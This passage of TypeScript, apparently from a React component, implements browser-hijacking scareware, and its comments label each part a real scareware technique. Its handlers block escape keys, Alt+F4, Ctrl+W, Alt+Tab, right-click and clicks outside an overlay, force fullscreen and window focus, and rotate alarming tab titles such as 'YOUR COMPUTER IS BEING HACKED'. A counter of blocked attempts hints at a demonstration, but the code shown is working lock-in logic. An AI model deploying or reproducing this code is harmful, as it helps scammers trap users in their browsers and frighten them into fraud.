    };

    // Real scareware technique: Block ALL escape methods
    const preventEscape = (e: KeyboardEvent) => {
      // Block all common escape keys
      if (e.key === 'Escape' || e.key === 'F11' || e.key === 'F5' || e.key === 'F12') {
        e.preventDefault();
        e.stopPropagation();
        setBlockedAttempts(prev => prev + 1);
        // Keep fullscreen even when escape is pressed
        setTimeout(forceFullscreen, 10);
        return false;
      }
    };

    const preventAltF4 = (e: KeyboardEvent) => {
      if (e.altKey && e.key === 'F4') {
        e.preventDefault();
        e.stopPropagation();
        setBlockedAttempts(prev => prev + 1);
        return false;
      }
    };

    const preventCtrlW = (e: KeyboardEvent) => {
      if (e.ctrlKey && e.key === 'w') {
        e.preventDefault();
        e.stopPropagation();
        setBlockedAttempts(prev => prev + 1);
        return false;
      }
    };

    const preventCtrlShiftW = (e: KeyboardEvent) => {
      if (e.ctrlKey && e.shiftKey && e.key === 'W') {
        e.preventDefault();
        e.stopPropagation();
        setBlockedAttempts(prev => prev + 1);
        return false;
      }
    };

    const preventAltTab = (e: KeyboardEvent) => {
      if (e.altKey && e.key === 'Tab') {
        e.preventDefault();
        e.stopPropagation();
        setBlockedAttempts(prev => prev + 1);
        return false;
      }
    };

    const preventCtrlAltDelete = (e: KeyboardEvent) => {
      if (e.ctrlKey && e.altKey && e.key === 'Delete') {
        e.preventDefault();
        e.stopPropagation();
        setBlockedAttempts(prev => prev + 1);
        return false;
      }
    };

    // Real scareware technique: Prevent right-click context menu
    const preventRightClick = (e: MouseEvent) => {
      e.preventDefault();
      e.stopPropagation();
      setBlockedAttempts(prev => prev + 1);
      return false;
    };

    // Real scareware technique: Prevent all mouse events outside the overlay
    const preventMouseEvents = (e: MouseEvent) => {
      if (!(e.target as Element).closest('.browser-hijacking-overlay')) {
        e.preventDefault();
        e.stopPropagation();
        setBlockedAttempts(prev => prev + 1);
        return false;
      }
    };

    // Real scareware technique: Prevent window focus loss
    const preventBlur = () => {
      window.focus();
      setBlockedAttempts(prev => prev + 1);
    };

    // Real scareware technique: Prevent tab switching with aggressive title changes
    const preventTabSwitch = () => {
      if (document.hidden) {
        document.title = '🚨 CRITICAL SYSTEM ALERT - RETURN IMMEDIATELY 🚨';
        setTimeout(() => {
          if (document.hidden) {
            document.title = '⚠️ YOUR COMPUTER IS BEING HACKED ⚠️';
            setTimeout(() => {
              if (document.hidden) {
                document.title = '💀 SYSTEM COMPROMISED - IMMEDIATE ACTION REQUIRED 💀';
                // Try to bring focus back
                window.focus();
              }
            }, 1000);
          }
        }, 1000);
      }
    };

    // Real scareware technique: Prevent window resizing and moving
    const preventResize = () => {
      if (!document.fullscreenElement) {
        window.resizeTo(window.innerWidth, window.innerHeight);
        window.moveTo(0, 0);
      }
    };

    // Start the browser hijacking
    const startHijacking = () => {
      setIsActive(true);
      forceFullscreen();
      
      // Escalate threat level over time
